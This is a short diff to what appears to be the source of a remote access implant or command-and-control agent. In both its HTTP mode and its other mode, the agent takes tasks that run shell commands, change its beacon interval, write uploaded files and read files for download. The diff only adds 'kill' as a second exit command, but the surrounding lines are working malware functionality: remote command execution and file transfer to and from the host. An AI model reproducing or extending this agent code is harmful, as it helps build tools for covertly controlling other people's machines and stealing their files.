@@ -222,7 +222,7 @@ if MODE=='http':
     try:
      if t['type']=='shell':out=run(t['command'])
      elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
-     elif t['type']=='exit':raise SystemExit
+     elif t['type'] in ('exit','kill'):raise SystemExit
      elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
      elif t['type']=='download':
       data=open(t['path'],'rb').read(2097153)
@@ -262,7 +262,7 @@ else:
      try:
       if t['type']=='shell':out=run(t['command'])
       elif t['type']=='sleep':C['interval']=int(t.get('arg') or 5)
-      elif t['type']=='exit':raise SystemExit
+      elif t['type'] in ('exit','kill'):raise SystemExit
       elif t['type']=='upload':open(t['path'],'wb').write(base64.b64decode(t.get('data') or ''));out='uploaded'
       elif t['type']=='download':
        data=open(t['path'],'rb').read(2097153)
